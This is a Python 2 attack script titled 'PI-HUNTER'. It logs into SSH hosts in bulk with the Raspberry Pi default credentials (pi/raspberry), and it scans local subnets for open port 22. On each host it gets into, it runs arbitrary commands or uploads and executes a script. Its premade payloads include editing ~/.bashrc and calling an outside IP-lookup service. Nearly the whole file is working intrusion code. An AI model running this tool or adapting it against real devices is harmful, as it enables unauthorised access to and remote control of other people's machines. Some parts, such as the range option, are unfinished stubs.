#!/usr/bin/python
import os
import argparse
import paramiko
import threading
import time
import socket
import ipcalc
from termcolor import cprint, colored

#config
BannerColor = "yellow"
SuccessColor = "green"
FailedColor = "red"

#TODO:
#make the arp local scan thing

#args
parser = argparse.ArgumentParser();

TargetGroup = parser.add_argument_group("Target")
TargetGroupOptions = TargetGroup.add_mutually_exclusive_group(required=True)
TargetGroupOptions.add_argument("-t", dest="target", help="Single target")
TargetGroupOptions.add_argument("-r", dest="ip_range", help="Range of targets")
TargetGroupOptions.add_argument("-a", dest="arp_scan", help="Scan local network with ARP", action="store_true")
TargetGroupOptions.add_argument("-f", dest="file", help="Use an ip list from a file")
TargetGroup.add_argument("--port", dest="port", type=int, help="Use custom port", default=22)

CredencialGroup = parser.add_argument_group("Credencials")
CredencialGroup.add_argument("-p", dest="password", help="Use custom password", type=str, default="raspberry")
CredencialGroup.add_argument("-u", dest="username", help="Use custom username", type=str, default="pi")

PayloadGroup = parser.add_argument_group("Payloads")
PayloadGroupOptions = PayloadGroup.add_mutually_exclusive_group(required=True)
PayloadGroupOptions.add_argument("-c", dest="command", help="Execute custom command")
PayloadGroupOptions.add_argument("-s", dest="script", help="Execute custom command")
PayloadGroupOptions.add_argument("--payload", dest="payload", help="Use premade payload")
PayloadGroupOptions.add_argument("--list", help="Shows all payloads", action="store_true")

args = parser.parse_args()

payloads = {
    "whoami": "whoami",
    "notify": "echo 'echo change your password' >> ~/.bashrc",
    "uname": "uname -a",
    "iplogger": "curl http://ipinfo.io/ip"
}

def main():
    PrintBanner()
    if args.list:
        for payload, description in payloads.items():
            print colored("[" + payload + "]:", "yellow") + " " + description
        print ""
        exit()

    payload = ""
    if args.command:
        payload = args.command
    elif args.script:
        payload = "./" + args.script
    elif args.payload:
        payload = payloads[args.payload]

    target = ""
    if args.target:
        target = args.target
        SendPayload(target, payload)
    elif args.ip_range:
        print "calculate ip range here"
    elif args.arp_scan:
        print "do a ARP scan here"
        ScanLocalNetwork("192.168.0.159")
    elif args.file:
        startTime = time.time()
        threads = []
        print str(startTime)
        Targets = open(args.file, "r").read().split("\n")
        for target in Targets:
            if target != "":
                threads.append(threading.Thread(target=SendPayload, args=[target, payload])) #fra 660 til 12
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        print "Took: " + str(startTime - time.time())

def SendPayload(target, payload):
    if args.script:
        ExecuteSshScript(target, args.port, args.username, args.password, os.path.basename(args.script), args.script)
    else:
        ExecuteSshCommand(target, args.port, args.username, args.password, payload)

def ExecuteSshCommand(target, port, username, password, payload):
    SSHClient = paramiko.SSHClient()
    SSHClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        SSHClient.connect(hostname=target, port=port, username=username, password=password)
        print colored("-" * 33 + "{", SuccessColor) +  colored(target, SuccessColor, attrs=["bold"]) +  colored("}" + "-" * (40-len(target)), SuccessColor)
        stdin, stdout, stderr = SSHClient.exec_command(payload)
        print colored("Executed payload: ", SuccessColor, attrs=["bold"]) + payload
        print ""
        for line in stdout.readlines():
            print line
    except:
        print colored("-" * 33 + "{" + target + "}" + "-" * (40-len(target)), FailedColor)
        cprint("Authentication failed", FailedColor, attrs=["bold"])
        print ""
    SSHClient.close()
def ExecuteSshScript(target, port, username, password, fileName, filePath):
    SSHClient = paramiko.SSHClient()
    SSHClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        SSHClient.connect(target, port, username, password)
        print colored("-" * 33 + "{", SuccessColor) +  colored(target, SuccessColor, attrs=["bold"]) +  colored("}" + "-" * (40-len(target)), SuccessColor)
        SFTPClient = SSHClient.open_sftp()
        remoteFile = SFTPClient.open("/home/pi/" + fileName, mode="w")
        remoteFile.write(open(filePath, "r").read())
        remoteFile.close()
        SFTPClient.close()
        stdin, stdout, stderr = SSHClient.exec_command("chmod +x " + fileName + " && /home/pi/" + fileName)
        print colored("Executed script: ", SuccessColor, attrs=["bold"]) + filePath
        for line in stdout.readlines():
            print line

            
    except:
        cprint("Authentication failed", FailedColor, attrs=["bold"])
        print ""
    SSHClient.close()


def ScanLocalNetwork(ip):
    print "Scanning"
    for host in range(1, HowManyHosts(ip)):
        newIp = ip.split(".")[0] + "." + ip.split(".")[1] + "." + ip.split(".")[1] + "."
        print "Scanning: " + newIp + str(host)
        threading.Thread(target=ScanHost, args=[newIp + str(host)]).start()
        time.sleep(0.1)

def ScanHost(ip):
    if(IsPortOpen(ip, 22)):
        print "SSH found: " + ip
def HowManyHosts(ip, prefix=24):
    return ipcalc.Network(ip, prefix).size()

def IsPortOpen(ip, port=22):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((ip, port))
    return result == 0

def PrintBanner():
    print ""
    cprint("########::'####::::::::::'##::::'##:'##::::'##:'##::: ##:'########:'########:'########::", BannerColor, attrs=["bold"])
    cprint("##.... ##:. ##::::::::::: ##:::: ##: ##:::: ##: ###:: ##:... ##..:: ##.....:: ##.... ##:", BannerColor, attrs=["bold"])
    cprint("##:::: ##:: ##::::::::::: ##:::: ##: ##:::: ##: ####: ##:::: ##:::: ##::::::: ##:::: ##:", BannerColor, attrs=["bold"])
    cprint("########::: ##::'#######: #########: ##:::: ##: ## ## ##:::: ##:::: ######::: ########::", BannerColor, attrs=["bold"])
    cprint("##.....:::: ##::........: ##.... ##: ##:::: ##: ##. ####:::: ##:::: ##...:::: ##.. ##:::", BannerColor, attrs=["bold"])
    cprint("##::::::::: ##::::::::::: ##:::: ##: ##:::: ##: ##:. ###:::: ##:::: ##::::::: ##::. ##::", BannerColor, attrs=["bold"])
    cprint("##::::::::'####:::::::::: ##:::: ##:. #######:: ##::. ##:::: ##:::: ########: ##:::. ##:", BannerColor, attrs=["bold"])
    cprint("..:::::::::....:::::::::::..:::::..:::.......:::..::::..:::::..:::::........::..:::::..:", BannerColor, attrs=["bold"])
    print ""
    print ""


main()
